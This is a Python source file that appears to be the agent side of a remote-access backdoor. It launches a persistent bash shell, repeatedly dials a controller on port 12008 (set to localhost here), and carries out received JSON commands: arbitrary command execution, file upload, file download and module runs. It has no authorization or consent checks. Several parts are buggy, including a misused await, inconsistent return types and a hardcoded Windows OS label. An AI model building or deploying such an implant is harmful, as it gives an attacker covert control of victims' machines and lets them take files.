import asyncio
import subprocess
import json

shell = subprocess.Popen(
    ["/bin/bash"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True
)

session_id = 0

modules = {

}


def generate_error(content) -> str:
    answer = {
        "type": "error",
        "data": {
            "content": content
        }
    }

    return json.dumps(answer)


def generate_file(file_name: str, content: str) -> str:
    answer = {
        "type": "file",
        "data": {
            "file_name": file_name,
            "content": content
        }
    }

    return json.dumps(answer)

def generate_result(output: str) -> str:
    answer = {
        "type": "result",
        "data": {
            "output": output
        }
    }

    print(json.dumps(answer))
    return json.dumps(answer)


async def execute(request) -> str:
    command = request["data"]["command"]

    full_command = command + '\necho __END__\n'
    await asyncio.to_thread(shell.stdin.write, full_command)
    await asyncio.to_thread(shell.stdin.flush)

    output = ""
    while True:
        line = await asyncio.to_thread(shell.stdout.readline)
        if not line:
            break  # Process died

        if line.strip() == "__END__":
            break
        output += line
    return generate_result(output)


async def upload(request) -> None:
    file_name = request["data"]["file_name"]
    content = request["data"]["content"]

    if isinstance(content, bytes):
        with open(file_name, "wb") as f:
            f.write(content)
    else:
        with open(file_name, "w") as f:
            f.write(content)

async def download(request) -> str:
    file_name = request["data"]["file_name"]

    try:
        with open(file_name, "r") as f:
            content = f.read()

        return generate_file(file_name, content)

    except FileNotFoundError:
        return generate_error("File not found")


async def run_module(request):
    module = request["data"]["module"]

    if module not in modules.keys():
        return generate_error("Module not found")
    await modules[module]()


async def kill(local=False):
    global writer
    if local:
        global session_id

        await writer.write(json.dumps({
            "type": "kill",
            "data": {
                "id": session_id,
            }
        }) + "EOM")

    writer.close()
    await writer.wait_closed()


async def info():
    answer = {
        "type": "info",
        "data": {
            "os": "WINDOWS",
        }
    }
    return answer

async def init(pack):
    global session_id
    session_id = pack["data"]["id"]

commands = {
    "exec": execute,
    "upload": upload,
    "download": download,
    "run_module": run_module,
    "kill": kill,
    "info": info,
    "session_init": init
}

async def send(request: str, writer_: asyncio.StreamWriter):
    b_request = request.encode() + b"EOM"
    writer_.write(b_request)

async def main(host: str):
    global reader, writer
    reader, writer = None, None

    while reader is None and writer is None:
        try:
            reader, writer = await asyncio.open_connection(host, 12008)
            break
        except ConnectionRefusedError:
            continue

    while True:
        instruction = b""
        while not b"EOM" in instruction:
            instruction += await reader.read(4096)

        instruction = instruction.replace(b"EOM", b"")
        instruction = instruction.decode()
        instruction = json.loads(instruction)
        if instruction["type"] not in commands:
            await send(generate_error("Invalid command"), writer)
            continue

        else:
            output = await commands[instruction["type"]](instruction)
            await send(output, writer)


if __name__ == "__main__":
    try:
        asyncio.run(main("127.0.0.1"))
    except KeyboardInterrupt:
        asyncio.run(kill())




